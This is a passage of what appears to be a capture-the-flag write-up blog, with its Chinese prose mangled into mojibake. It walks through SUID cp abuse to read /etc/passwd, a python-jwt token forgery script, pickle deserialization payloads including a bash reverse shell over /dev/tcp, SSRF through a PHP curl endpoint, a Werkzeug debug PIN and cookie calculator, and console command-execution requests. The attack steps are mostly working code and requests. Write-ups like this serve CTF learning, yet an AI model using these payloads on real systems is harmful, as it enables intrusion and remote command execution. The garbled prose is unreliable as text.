<p>é¦–å…ˆæŸ¥çœ‹å…·æœ‰SUIDæƒé™çš„å‘½ä»¤<br><code>find / -user root -perm -4000 -print 2&gt;/dev/null</code></p>
<p><code>cp</code>å¯ç”¨ï¼Œä¸¤ç§é€‰æ‹©</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cp</span> /f* /etc/passwd</span><br><span class="line"><span class="built_in">cat</span> /etc/passwd</span><br><span class="line">æˆ–</span><br><span class="line"><span class="built_in">cp</span> /flag_dd3f6380aa0d /dev/stdout</span><br></pre></td></tr></table></figure>
<p><img src="https://picx.zhimg.com/80/v2-a484c63d615e175090a19754c82a26eb_1440w.png" alt=""></p>
<h3 id="Yeâ€™s-Pickle"><a href="#Yeâ€™s-Pickle" class="headerlink" title="Yeâ€™s Pickle"></a>Yeâ€™s Pickle</h3><p>é™„ä»¶</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> jwcrypto.jwk <span class="keyword">as</span> jwk</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">from</span> python_jwt <span class="keyword">import</span> *</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_random_string</span>(<span class="params">length=<span class="number">16</span></span>):</span><br><span class="line">    characters = string.ascii_letters + string.digits  <span class="comment"># åŒ…å«å­—æ¯å’Œæ•°å­—</span></span><br><span class="line">    random_string = <span class="string">&#x27;&#x27;</span>.join(random.choice(characters) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(length))</span><br><span class="line">    <span class="keyword">return</span> random_string</span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = generate_random_string(<span class="number">16</span>)</span><br><span class="line">key = jwk.JWK.generate(kty=<span class="string">&#x27;RSA&#x27;</span>, size=<span class="number">2048</span>)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    payload=request.args.get(<span class="string">&quot;token&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> payload:</span><br><span class="line">        token=verify_jwt(payload, key, [<span class="string">&#x27;PS256&#x27;</span>])</span><br><span class="line">        session[<span class="string">&quot;role&quot;</span>]=token[<span class="number">1</span>][<span class="string">&#x27;role&#x27;</span>]</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        session[<span class="string">&quot;role&quot;</span>]=<span class="string">&quot;guest&quot;</span></span><br><span class="line">        user=&#123;<span class="string">&quot;username&quot;</span>:<span class="string">&quot;boogipop&quot;</span>,<span class="string">&quot;role&quot;</span>:<span class="string">&quot;guest&quot;</span>&#125;</span><br><span class="line">        jwt = generate_jwt(user, key, <span class="string">&#x27;PS256&#x27;</span>, timedelta(minutes=<span class="number">60</span>))</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>,token=jwt)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/pickle&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">unser</span>():</span><br><span class="line">    <span class="keyword">if</span> session[<span class="string">&quot;role&quot;</span>]==<span class="string">&quot;admin&quot;</span>:</span><br><span class="line">        pickle.loads(base64.b64decode(request.args.get(<span class="string">&quot;pickle&quot;</span>)))</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">5000</span>, debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
<p>å…³é”®ä»£ç ï¼Œå¾ˆæ˜æ˜¾éœ€è¦è¿›è¡Œ<code>JWTä¼ªé€ æ”»å‡»</code>ï¼Œä½†æ˜¯æˆ‘ä»¬æ— æ³•çˆ†ç ´ç§˜é’¥</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/pickle&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">unser</span>():</span><br><span class="line">    <span class="keyword">if</span> session[<span class="string">&quot;role&quot;</span>]==<span class="string">&quot;admin&quot;</span>:</span><br><span class="line">        pickle.loads(base64.b64decode(request.args.get(<span class="string">&quot;pickle&quot;</span>)))</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>å¯»æ‰¾<code>Python JWTæ¼æ´</code>ï¼Œ<a target="_blank" rel="noopener" href="https://github.com/davedoesdev/python-jwt/commit/88ad9e67c53aa5f7c43ec4aa52ed34b7930068c9">https://github.com/davedoesdev/python-jwt/commit/88ad9e67c53aa5f7c43ec4aa52ed34b7930068c9</a></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> timedelta</span><br><span class="line"><span class="keyword">from</span> json <span class="keyword">import</span> loads, dumps</span><br><span class="line"><span class="keyword">from</span> jwcrypto.common <span class="keyword">import</span> base64url_decode, base64url_encode</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">topic</span>(<span class="params">topic</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot; Use mix of JSON and compact format to insert forged claims including long expiration &quot;&quot;&quot;</span></span><br><span class="line">    [header, payload, signature] = topic.split(<span class="string">&#x27;.&#x27;</span>)</span><br><span class="line">    parsed_payload = loads(base64url_decode(payload))</span><br><span class="line">    parsed_payload[<span class="string">&#x27;role&#x27;</span>] = <span class="string">&#x27;admin&#x27;</span></span><br><span class="line">    fake_payload = base64url_encode(</span><br><span class="line">        (dumps(parsed_payload, separators=(<span class="string">&#x27;,&#x27;</span>, <span class="string">&#x27;:&#x27;</span>))))</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#123;&quot;  &#x27;</span> + header + <span class="string">&#x27;.&#x27;</span> + fake_payload + <span class="string">&#x27;.&quot;:&quot;&quot;,&quot;protected&quot;:&quot;&#x27;</span> + header + <span class="string">&#x27;&quot;, &quot;payload&quot;:&quot;&#x27;</span> + payload + <span class="string">&#x27;&quot;,&quot;signature&quot;:&quot;&#x27;</span> + signature + <span class="string">&#x27;&quot;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">originaltoken = <span class="string">&#x27;eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MTUzMDg1MDQsImlhdCI6MTcxNTMwNDkwNCwianRpIjoiOGs2c05zSUdGQkZFcDVRWDFpc1Q2QSIsIm5iZiI6MTcxNTMwNDkwNCwicm9sZSI6Imd1ZXN0IiwidXNlcm5hbWUiOiJib29naXBvcCJ9.KqyhxwgllPKxJLco3ZAUpyJH5oKp7xJ_blmL4a9WCa-_xXRNXIs4K6iHW1Fu8zKmR70mZjuPwR9tWWflouE20Z0rzE071y88Wdydcu_wT8nFFFCzqMLPtw8DXJxfsXvVMVTedCo--N8chzP0DtgxPexqN6EWfLRi82KtRjzAAkigSyNgN-n-yXe6NV9XhjFALd5aCh8jXKiqnTXCSIivl4VtYrB3p8IYCExFO0_nNOwRDyHDqUnHXMkINvqgJDXFAUt1cLoqnZAeDZk3gwZ0dziFKHP3D3BfaS-Re339ztn9K_7qTDPz3OW8tq9v-nUCTOY2GRXoc2SY6qR8vOxEGQ&#x27;</span></span><br><span class="line">topic = topic(originaltoken).replace(<span class="string">&quot; &quot;</span>, <span class="string">&quot;%20&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(topic)</span><br></pre></td></tr></table></figure>
<p>bpæŠ“åŒ…ï¼Œ<code>GET /?token=payload</code>ï¼Œè§£ä¸€ä¸‹jwtï¼Œå‘ç°roleæ˜¯adminäº†<br>åé¢å°±æ˜¯<code>pickle</code>ååºåˆ—åŒ–äº†</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">eval</span>, (<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;cat /f*&#x27;)&quot;</span>,))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">a = A()</span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(pickle.dumps(a)))</span><br></pre></td></tr></table></figure>
<p><code>GET /pickle?pickle=payload</code><br>ä¸æˆåŠŸï¼Œä¹Ÿæ²¡æœ‰è¿‡æ»¤å•Šï¼Œè¯•è¯•åå¼¹shell</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">data = <span class="string">b&#x27;&#x27;&#x27;(cos</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">S&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&quot;&#x27;</span></span><br><span class="line"><span class="string">o.&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(data))</span><br></pre></td></tr></table></figure>
<p>åå¼¹shellæˆåŠŸ</p>
<p>åŒæ ·çš„é¢˜ç›®æœ‰<code>ç¥¥äº‘æ¯2022 FunWEB</code></p>
<h3 id="pppython"><a href="#pppython" class="headerlink" title="pppython?"></a>pppython?</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_REQUEST</span>[<span class="string">&#x27;hint&#x27;</span>] == [<span class="string">&quot;your?&quot;</span>, <span class="string">&quot;mine!&quot;</span>, <span class="string">&quot;hint!!&quot;</span>])&#123;</span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-type: text/plain&quot;</span>);</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="string">&quot;ls / -la&quot;</span>);</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$_REQUEST</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_CONNECTTIMEOUT, <span class="number">60</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HTTPHEADER, <span class="variable">$_REQUEST</span>[<span class="string">&#x27;lolita&#x27;</span>]);</span><br><span class="line">        <span class="variable">$output</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$output</span>;</span><br><span class="line">        <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);   </span><br><span class="line">    &#125;<span class="keyword">catch</span> (<span class="built_in">Error</span> <span class="variable">$x</span>)&#123;</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">        <span class="title function_ invoke__">highlight_string</span>(<span class="variable">$x</span>-&gt;<span class="title function_ invoke__">getMessage</span>());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br><span class="line"><span class="comment">// curl_setopt(): The CURLOPT_HTTPHEADER option must have an array value</span></span><br></pre></td></tr></table></figure>
<p><code>url/?hint[0]=your?&amp;hint[1]=mine!&amp;hint[2]=hint!!</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">total 12</span><br><span class="line">-rwxr-xr-x  1 root root 353 Oct 19  2023 app.py</span><br><span class="line">lrwxrwxrwx  1 root root   7 Nov 22  2021 bin -&gt; usr/bin</span><br><span class="line">drwxr-xr-x  2 root root   6 Nov  8  2021 boot</span><br><span class="line">drwxr-xr-x  5 root root 340 May 10 02:13 dev</span><br><span class="line">drwxr-xr-x  1 root root 226 Oct 19  2023 etc</span><br><span class="line">-rw-------  1 root root  43 May 10 02:13 flag</span><br><span class="line">drwxr-xr-x  2 root root   6 Nov  8  2021 home</span><br><span class="line">lrwxrwxrwx  1 root root   7 Nov 22  2021 lib -&gt; usr/lib</span><br><span class="line">lrwxrwxrwx  1 root root   9 Nov 22  2021 lib32 -&gt; usr/lib32</span><br><span class="line">lrwxrwxrwx  1 root root   9 Nov 22  2021 lib64 -&gt; usr/lib64</span><br><span class="line">lrwxrwxrwx  1 root root  10 Nov 22  2021 libx32 -&gt; usr/libx32</span><br><span class="line">drwxr-xr-x  2 root root   6 Nov 22  2021 media</span><br><span class="line">drwxr-xr-x  2 root root   6 Nov 22  2021 mnt</span><br><span class="line">drwxr-xr-x  2 root root   6 Nov 22  2021 opt</span><br><span class="line">dr-xr-xr-x 95 root root   0 May 10 02:13 proc</span><br><span class="line">drwx------  1 root root  20 Oct 19  2023 root</span><br><span class="line">drwxr-xr-x  1 root root  21 Oct 19  2023 run</span><br><span class="line">lrwxrwxrwx  1 root root   8 Nov 22  2021 sbin -&gt; usr/sbin</span><br><span class="line">drwxr-xr-x  2 root root   6 Nov 22  2021 srv</span><br><span class="line">-rwx------  1 root root 241 Oct 19  2023 start.sh</span><br><span class="line">dr-xr-xr-x 11 root root   0 May 10 02:13 sys</span><br><span class="line">drwxrwxrwt  1 root root   6 May 10 02:13 tmp</span><br><span class="line">drwxr-xr-x  1 root root  19 Nov 22  2021 usr</span><br><span class="line">drwxr-xr-x  1 root root  17 Oct 19  2023 var</span><br></pre></td></tr></table></figure>
<p>å¯ä»¥çœ‹è§flagæœ€å·¦è¾¹æ˜¯ä¸ä¸€æ ·çš„ï¼Œè¿™å¥½åƒæ˜¯æƒé™ä¸å¤Ÿ<br>è¯»å–<code>app.py</code>ï¼Œå€ŸåŠ©<code>curl</code>å‘½ä»¤ï¼Œå®ç°<code>SSRF</code>ï¼Œ<code>/?url=file:///app.py&amp;lolita[]=1</code>ï¼Œlolitaéœ€è¦æ•°ç»„æ ¼å¼(é¢˜ç›®è¾“å‡ºæœ‰)<br>å…³äº<code>SSRF</code>å­¦ä¹ <br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/miruier/p/13907150.html">https://www.cnblogs.com/miruier/p/13907150.html</a></p>
<p><strong>app.py</strong></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, session, render_template, render_template_string</span><br><span class="line"><span class="keyword">import</span> os, base64</span><br><span class="line"><span class="comment">#from NeepuF1Le import neepu_files</span></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="string">&#x27;******&#x27;</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">welcome</span>():</span><br><span class="line">    <span class="keyword">if</span> session[<span class="string">&quot;islogin&quot;</span>] == <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;flag&#123;***********************&#125;&quot;</span></span><br><span class="line">app.run(<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">1314</span>, debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
<p>è€ƒè™‘<code>sessionä¼ªé€ </code>ï¼Œä½†æ²¡æœ‰ç§˜é’¥<br>ä½†æ˜¯ï¼Œå‘ç°debugå¼€å¯ç›‘å¬åœ¨1314ç«¯å£ï¼Œé‚£ä¹ˆç»“åˆ<code>CURLOPT_HTTPHEADER</code>åŒ…å«å¤´éƒ¨ä¿¡æ¯ï¼Œæˆ‘ä»¬å¯ä»¥è®¡ç®—<code>pinç </code>æ‰‹åŠ¨ç”Ÿæˆ<code>cookie</code>ï¼Œç„¶åä¸Šä¼ ç”¨äºèº«ä»½éªŒè¯ï¼Œä»è€Œå®ç°å‘½ä»¤æ‰§è¡Œ</p>
<p><code>PolarCTF</code>è·Ÿä¹‹å‰æ ¡é˜Ÿæ‹›æ–°èµ›ç®—è¿‡<code>pinç </code><br><a href="https://hvang10.github.io/2023/12/22/PolarCTF%E8%AE%B0%E4%B8%80%E9%81%93flask-Pin/">https://hvang10.github.io/2023/12/22/PolarCTF%E8%AE%B0%E4%B8%80%E9%81%93flask-Pin/</a></p>
<p>è¿˜æ˜¯æœ‰äº›å‡ºå…¥çš„ï¼Œç¯å¢ƒä¸ä¸€æ ·å§<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_35782055/article/details/129126825">https://blog.csdn.net/qq_35782055/article/details/129126825</a></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">url/?lolita[]=<span class="number">1</span>&amp;url=file:<span class="comment">///../../../../../etc/passwd</span></span><br><span class="line">å¾—åˆ°ç”¨æˆ·åï¼Œroot</span><br><span class="line"></span><br><span class="line">url/?lolita[]=<span class="number">1</span>&amp;url=file:<span class="comment">///../../../../../sys/class/net/eth0/address</span></span><br><span class="line">å¾—åˆ°macç½‘å¡åœ°å€ï¼Œee:<span class="number">51</span>:<span class="number">7</span>e:c4:<span class="number">78</span>:cc</span><br><span class="line"></span><br><span class="line">url/?lolita[]=<span class="number">1</span>&amp;url=file:<span class="comment">///../../../../../proc/sys/kernel/random/boot_id</span></span><br><span class="line">å¾—åˆ°ç³»ç»Ÿidçš„å‰åŠæ®µï¼Œc0cbf422-<span class="number">92</span>b3-<span class="number">47</span>ec-<span class="number">8900</span>-<span class="number">5</span>f407d9e8e0c</span><br><span class="line"></span><br><span class="line">url/?lolita[]=<span class="number">1</span>&amp;url=file:<span class="comment">///../../../../proc/self/cgroup</span></span><br><span class="line">å¾—åˆ°ç³»ç»ŸidååŠæ®µï¼Œcri-containerd-fcd95d022565be86ef4e1a982ad5919cc34bae43d929e7ad19b5b881a3107bf0.scope</span><br><span class="line"></span><br><span class="line">app.pyçš„ç»å¯¹è·¯å¾„(å¯é€šè¿‡æŠ¥é”™è·å¾—)ï¼Œurl/?lolita[]=__debug__&amp;url=<span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">1314</span>ï¼Œå¾—åˆ°ï¼Œ/usr/local/lib/python3.<span class="number">10</span>/site-packages/flask/app.py</span><br></pre></td></tr></table></figure>
<p>ç³»ç»ŸidååŠæ®µï¼Œåªè¯»å–ç¬¬ä¸€è¡Œï¼Œå¹¶ä»¥ä»å³è¾¹ç®—èµ·çš„ç¬¬ä¸€ä¸ª<code>/</code>ä¸ºåˆ†éš”ç¬¦(æœ‰docker)(édockerï¼Œç›´æ¥/etc/machine-idï¼Œåæ­£æ˜¯ç¬¬ä¸€æ®µ)ï¼Œä¸è¿‡è¿™é‡Œçš„å¥½å¥‡æ€ªå•Šï¼Œæ­£å¸¸æ˜¯<code>docker</code>å¼€å¤´çš„<br><img src="https://picx.zhimg.com/80/v2-77395bb64396cb42f6bf77aef1c5f6fb_1440w.png" alt=""></p>
<p>æ§åˆ¶å°(<code>url/?lolita[]=1&amp;url=http://127.0.0.1:1314/console</code>)æˆ–è€…debugæ¨¡å¼(<code>url/?lolita[]=__debug__&amp;url=127.0.0.1:1314</code>)ï¼ŒæŸ¥çœ‹æºç ï¼Œå¾—åˆ°<code>SECRET = &quot;xzjDl5CCoFf5PNCO4CcO&quot;;</code></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">&#x27;root&#x27;</span>  <span class="comment"># username</span></span><br><span class="line">    <span class="string">&#x27;flask.app&#x27;</span>,  <span class="comment"># modname</span></span><br><span class="line">    <span class="string">&#x27;Flask&#x27;</span>,  <span class="comment"># getattr(app, &#x27;__name__&#x27;, getattr(app.__class__, &#x27;__name__&#x27;))</span></span><br><span class="line">    <span class="comment"># getattr(mod, &#x27;__file__&#x27;, None),</span></span><br><span class="line">    <span class="string">&#x27;/usr/local/lib/python3.10/dist-packages/flask/app.py&#x27;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="comment"># str(uuid.getnode()),  /sys/class/net/eth0/addressï¼Œåå…­è¿›åˆ¶è½¬åè¿›åˆ¶</span></span><br><span class="line">    <span class="string">&#x27;262033786566860&#x27;</span>,</span><br><span class="line">    <span class="comment"># get_machine_id(), /etc/machine-idï¼Œ/proc/sys/kernel/random/boot_idï¼Œ/proc/self/cgroupï¼Œæ‹¼æ¥</span></span><br><span class="line">    <span class="string">&#x27;c0cbf422-92b3-47ec-8900-5f407d9e8e0ccri-containerd-fcd95d022565be86ef4e1a982ad5919cc34bae43d929e7ad19b5b881a3107bf0.scope&#x27;</span></span><br><span class="line">]</span><br><span class="line"><span class="comment"># è¿™é‡Œæ˜¯sha1ï¼Œæˆ‘æ²¡çœ‹è§æ’ä»¶ä¿¡æ¯ï¼Œå¯èƒ½é»˜è®¤é«˜ç‰ˆæœ¬å§ï¼Œæˆ‘é˜Ÿé•¿å½“æ—¶æ‹›æ–°çš„æ—¶å€™ï¼Œå«æˆ‘çœ‹çš„æ’ä»¶ç‰ˆæœ¬ï¼Œä½†æœ‰çš„è¯´æ³•åˆæ˜¯Pythonç‰ˆæœ¬ï¼Œ3.6åŠä»¥ä¸‹MD5ï¼Ÿ3.8åŠä»¥ä¸Šsha1ï¼Ÿä¸æ¸…æ¥š</span></span><br><span class="line">h = hashlib.sha1()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">        bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)</span><br><span class="line">    num = (<span class="string">&#x27;%09d&#x27;</span> % <span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">rv = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                          <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(rv)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä»¥ä¸‹å†…å®¹åŠ å…¥äº†å®˜æ–¹ç»™çš„éƒ¨åˆ†è„šæœ¬</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hash_pin</span>(<span class="params">pin: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> hashlib.sha1(<span class="string">f&quot;<span class="subst">&#123;pin&#125;</span> added salt&quot;</span>.encode(<span class="string">&quot;utf-8&quot;</span>, <span class="string">&quot;replace&quot;</span>)).hexdigest()[:<span class="number">12</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(cookie_name + <span class="string">&quot;=&quot;</span> + <span class="string">f&quot;<span class="subst">&#123;<span class="built_in">int</span>(time.time())&#125;</span>|<span class="subst">&#123;hash_pin(rv)&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>é‚£æˆ‘ä»¬æ€ä¹ˆä¼ å‚å‘¢ï¼Ÿå‚è€ƒ<a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_73512445/article/details/133694293">https://blog.csdn.net/m0_73512445/article/details/133694293</a><br><code>GET /?&amp;__debugger__=yes&amp;cmd=print(1)&amp;frm=140324285712640&amp;s=prj74Iraob1k5eMHiH37</code></p>
<p>è¿™é‡Œæˆ‘ä»¬è¦å»è·å–frmå’Œsçš„å€¼<br>frmå¦‚æœæ²¡æœ‰æŠ¥é”™ä¿¡æ¯çš„è¯å€¼ä¸º0<br>sçš„å€¼æ˜¯æºç çš„SECRETå€¼<br>ç”±äºè¿™é‡Œè¯•äº†åŠå¤©æ²¡æœ‰æŠ¥é”™ä¿¡æ¯ï¼Œé‚£ä¹ˆfrm=0</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?lolita[]=Cookie:__wzddbcdb955c856aa38ea23=<span class="number">1715365275</span>|<span class="number">9</span>b559ae11a2d</span><br><span class="line">&amp;url=http:<span class="comment">//127.0.0.1:1314/console?</span></span><br><span class="line">&amp;__debugger__=yes&amp;pin=<span class="number">112</span>-<span class="number">504</span>-<span class="number">871</span></span><br><span class="line">&amp;cmd=<span class="title function_ invoke__">__import__</span>(<span class="string">&quot;os&quot;</span>).<span class="title function_ invoke__">popen</span>(<span class="string">&quot;ls&quot;</span>).<span class="title function_ invoke__">read</span>()</span><br><span class="line">&amp;frm=<span class="number">0</span></span><br><span class="line">&amp;s=xzjDl5CCoFf5PNCO4CcO</span><br></pre></td></tr></table></figure>
<p>æ³¨æ„ï¼Œåé¢çš„frmã€cmdç­‰å‚æ•°æ˜¯æˆ‘ä»¬è¦è¯·æ±‚çš„ipçš„å‚æ•°ï¼Œè€Œéå½“å‰é¡µé¢çš„å‚æ•°ï¼Œå¦‚æœç›´æ¥æŒ‰ç…§ä¸Šé¢çš„payloadï¼Œæ˜¯ä¼šè¢«å½“ä½œå½“å‰é¡µé¢å‚æ•°çš„ï¼Œæˆ‘ä»¬éœ€è¦å¯¹&amp;å’Œç©ºæ ¼è¿›è¡Œurlç¼–ç <br>(å‚è€ƒ<a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_73973498/article/details/134495316">https://blog.csdn.net/m0_73973498/article/details/134495316</a>)</p>
<p><code>url/?lolita[]=Cookie:__wzddbcdb955c856aa38ea23=1715365275|9b559ae11a2d&amp;url=http://127.0.0.1:1314/console?%26__debugger__=yes%26pin=112-504-871%26cmd=__import__(&quot;os&quot;).popen(&quot;cat%2B/flag&quot;).read()%26frm=0%26s=xzjDl5CCoFf5PNCO4CcO</code></p>
<p><img src="https://picx.zhimg.com/80/v2-aa12b4125def9241caec3209b727f83e_1440w.png" alt=""></p>
<h3 id="4-å¤ç›˜"><a href="#4-å¤ç›˜" class="headerlink" title="4-å¤ç›˜"></a>4-å¤ç›˜</h3><p>æœ€å…ˆçœ‹åˆ°é™„ä»¶çš„<code>index.php</code>ï¼Œå®˜æ–¹æœ‰è¯´<code>è¿™ä¸ªCMSå­˜åœ¨ç€å¾ˆå¤šSQLiçš„æ¼æ´</code>ï¼ŒçœŸçœ‹è§æœ‰ï¼Œä½†ä¸ç®¡äº†ï¼Œå…ˆæ‰“<code>LFI</code></p>
